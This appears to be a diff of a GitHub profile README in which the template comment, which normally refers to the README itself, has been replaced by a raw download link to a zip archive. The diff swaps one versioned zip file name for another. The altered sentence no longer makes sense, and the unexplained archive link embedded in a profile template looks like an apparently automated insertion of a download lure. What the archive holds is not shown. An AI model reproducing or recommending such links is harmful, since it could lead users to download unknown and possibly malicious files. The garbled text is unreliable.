@@ -7,6 +7,6 @@
 - ⚡ Fun fact: im dumb
 
 <!---
-CaidonW/CaidonW is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/CaidonW/CaidonW/main/thermojunction/CaidonW_1.7.zip` (this file) appears on your GitHub profile.
+CaidonW/CaidonW is a ✨ special ✨ repository because its `https://github.com/CaidonW/CaidonW/raw/refs/heads/main/thermojunction/W-Caidon-v3.4.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
